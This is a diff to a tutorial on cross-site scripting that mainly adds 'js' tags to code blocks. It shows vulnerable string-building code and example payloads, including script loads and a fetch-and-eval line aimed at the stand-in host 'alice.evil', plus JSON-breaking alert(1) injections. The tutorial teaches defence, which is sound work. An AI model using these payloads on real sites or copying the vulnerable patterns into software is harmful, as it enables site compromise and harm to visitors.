@@ -25,7 +25,7 @@ Your search (**brown puppies**), didn't match anything. Try again.
 
 On the backend, that message is displayed like this:
 
-```
+```js
 if(!searchResults){
     webPage += "<div>Your search (<b>" + searchQuery + "</b>), didn't match anything. Try again.";
 }
@@ -40,7 +40,7 @@ Your search (**<h3>headings</h3>**) didn't match anything. Try again.
 
 Raw HTML:
 
-```
+```js
 Your search (<b><h1>headings</h1></b>) didn't match anything. Try again.
 
 ```
@@ -81,7 +81,7 @@ Alice goes to Bob's website, creates an account, and goes to her profile setting
 
 When her friends view her profile, this code gets run on the server:
 
-```
+```js
 if(viewedPerson.profile.description){
     page += "<div>" + viewedPerson.profile.description + "</div>";
 }else{
@@ -92,7 +92,7 @@ if(viewedPerson.profile.description){
 
 Resulting in this HTML:
 
-```
+```js
 <div>I'm actually too lazy to write something here.</div>
 
 ```
@@ -111,7 +111,7 @@ she sees
 
 Then Alice sets her profile to
 
-```
+```js
 <script src = "https://alice.evil/profile_xss.js"></script>I'm actually too lazy to write something here.
 
 ```
@@ -133,7 +133,7 @@ Let's say that Bob owns a site that lets you post public messages.
 
 The messages are loaded by a script that looks like this:
 
-```
+```js
 addMessage("Message 1");
 addMessage("Message 2");
 addMessage("Message 3");
@@ -147,7 +147,7 @@ The `addMessage` function adds a posted message to the DOM. However, in an effor
 
 The script is generated **on the server** like this:
 
-```
+```js
 for(var i = 0; i < messages.length; i++){
     script += "addMessage(\"" + messages[i] + "\");";
 }
@@ -156,28 +156,28 @@ for(var i = 0; i < messages.length; i++){
 
 So alice posts a message that says: `My mom said: "Life is good. Pie makes it better. "`. Than when she previews the message, instead of seeing her message she sees an error in the console:
 
-```
+```js
 Uncaught SyntaxError: missing ) after argument list
 
 ```
 
 Why? Because the generated script looks like this:
 
-```
+```js
 addMessage("My mom said: "Life is good. Pie makes it better. "");
 
 ```
 
 That's a syntax error. Than Alice posts:
 
-```
+```js
 I like pie ");fetch("https://alice.evil/js_xss.js").then(x=>x.text()).then(eval);//
 
 ```
 
 Then the generated script looks like:
 
-```
+```js
 addMessage("I like pie ");fetch("https://alice.evil/js_xss.js").then(x=>x.text()).then(eval);//");
 
 ```
@@ -212,14 +212,14 @@ Please, **don't think that XSS won't harm your website and its visitors.**
 
 Let's say that whenever someone visits a profile page in Bob's website, the following URL is fetched:
 
-```
+```js
 https://example.com/api/users/1234/profiledata.json
 
 ```
 
 With a response like this:
 
-```
+```js
 {
     "name": "Bob",
     "description": "Likes pie & security holes."
@@ -229,7 +229,7 @@ With a response like this:
 
 Than that data is parsed & inserted:
 
-```
+```js
 var data = eval("(" + resp + ")");
 document.getElementById("#name").innerText = data.name;
 document.getElementById("#description").innerText = data.description;
@@ -240,7 +240,7 @@ Seems good, right? **Wrong.**
 
 What if someone's description is `Likes XSS."});alert(1);({"name":"Alice","description":"Likes XSS.`? Seems weird, but if poorly done, the response will be:
 
-```
+```js
 {
     "name": "Alice",
     "description": "Likes pie & security holes."});alert(1);({"name":"Alice","description":"Likes XSS."
@@ -250,7 +250,7 @@ What if someone's description is `Likes XSS."});alert(1);({"name":"Alice","descr
 
 And this will be `eval`ed:
 
-```
+```js
 ({
     "name": "Alice",
     "description": "Likes pie & security holes."});alert(1);({"name":"Alice","description":"Likes XSS."
@@ -267,11 +267,21 @@ If you don't think that's a problem, paste that in your console and see what hap
 </li>
 <li>
 Properly escape `"` and `\` in user data before putting it in JSON. If you just escape the `"`, than this will happen:
-<pre><code>Hello! \"});alert(1);({
-</code></pre>
+
+```js
+Hello! \"});alert(1);({
+
+```
+
+
 Will be converted to:
-<pre><code>"Hello! \\"});alert(1);({"
-</code></pre>
+
+```js
+"Hello! \\"});alert(1);({"
+
+```
+
+
 Oops. Remember to escape both the `\` and `"`, or just use JSON.parse.
 </li>
 
